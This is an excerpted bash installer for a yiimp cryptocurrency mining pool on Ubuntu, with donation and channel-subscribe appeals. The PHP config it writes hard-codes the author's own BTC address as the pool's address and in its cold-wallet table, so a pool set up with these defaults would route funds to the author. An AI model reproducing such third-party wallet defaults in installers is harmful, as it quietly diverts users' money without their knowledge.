#!/bin/bash
################################################################################
# Author:   imskaa , truvot
# 
# Web:      getwazzle.com
#
# Program:
#   Install yiimp on Ubuntu 16.04 running Nginx, MariaDB, and php7.x
# BTC Donation: 1NfSksGzyEq2bi1hrsKNcxxSPtJp6H6LNR DOGE Donation : DS9AnZZqtrTZHHEzEeS1mc1McUrdq2Phw4
# 
################################################################################
output() {
    printf "\E[0;33;40m"
...
output ""
    ...
    clear 
    output "BTC Donation: 1NfSksGzyEq2bi1hrsKNcxxSPtJp6H6LNR DOGE Donation : DS9AnZZqtrTZHHEzEeS1mc1McUrdq2Phw4"
    output ""
    output "Try to click subscribe on my channel : shorturl.at/cwFGM"
    output ""
    output "Need help ? imskaa.co@gmail.com"
    output ""
...
' | sudo -E tee /etc/nginx/blockuseragents.rules >/dev/null 2>&1
    ...
    cd ~
    git clone https://github.com/Wazzle-Core/yiimp.git
    cd yiimp
...
define('"'"'YAAMP_BTCADDRESS'"'"', '"'"'1NfSksGzyEq2bi1hrsKNcxxSPtJp6H6LNR'"'"');
define('"'"'YAAMP_SITE_URL'"'"', '"'"'panel.'"${server_name}"''"'"');
define('"'"'YAAMP_STRATUM_URL'"'"', YAAMP_SITE_URL); // change if your stratum server is on a different host
define('"'"'YAAMP_SITE_NAME'"'"', '"'"'WazzleCoin-Pool'"'"');
...
define('"'"'NICEHASH_DEPOSIT_AMOUNT'"'"','"'"'0.01'"'"');
$cold_wallet_table = array(
    '"'"'1NfSksGzyEq2bi1hrsKNcxxSPtJp6H6LNR'"'"' => 0.10,
);
// Sample fixed pool fees
$configFixedPoolFees = array(
        '"'"'zr5'"'"' => 2.0,
...
output ""
output "If you found this script helpful please consider donating some BTC Donation: 1NfSksGzyEq2bi1hrsKNcxxSPtJp6H6LNR DOGE Donation : DS9AnZZqtrTZHHEzEeS1mc1McUrdq2Phw4"
output ""
output "Try to click subscribe on my channel : shorturl.at/cwFGM"
output ""
output "Need help ? imskaa.co@gmail.com"
